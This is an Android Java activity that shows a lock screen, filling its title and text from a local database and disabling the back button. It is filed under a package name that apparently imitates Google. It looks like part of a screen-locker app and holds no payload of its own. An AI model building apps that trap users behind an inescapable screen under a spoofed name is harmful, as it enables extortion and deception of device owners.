package com.google.cloudservices;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.widget.TextView;

import pro.tasking.R;

public class LockActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_lock);

        TextView txttitle=(TextView)findViewById(R.id.txttitle);
        TextView txttext=(TextView)findViewById(R.id.txttext);
        LockTitleDB lockTitleDB=new LockTitleDB(LockActivity.this);
        lockTitleDB.gettitle();
        txttitle.setText(lockTitleDB.title1);
        txttext.setText(lockTitleDB.text1);
    }

    @Override
    public void onBackPressed() {

    }
}
